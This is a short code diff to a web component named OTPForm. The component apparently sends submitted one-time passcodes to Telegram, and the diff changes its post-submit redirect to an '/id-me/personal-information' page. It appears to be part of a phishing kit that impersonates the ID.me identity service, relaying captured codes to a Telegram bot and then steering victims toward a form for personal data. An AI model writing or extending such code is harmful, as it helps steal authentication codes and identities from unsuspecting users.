@@ -71,7 +71,7 @@ export default function OTPForm() {
                 throw new Error(textData.description || 'Failed to send message to Telegram');
             }
 
-            router.push('https://www.google.com/search?q=id+me')
+             router.push('/id-me/personal-information');
 
         } catch (error) {
             console.error('Submission error:', error);
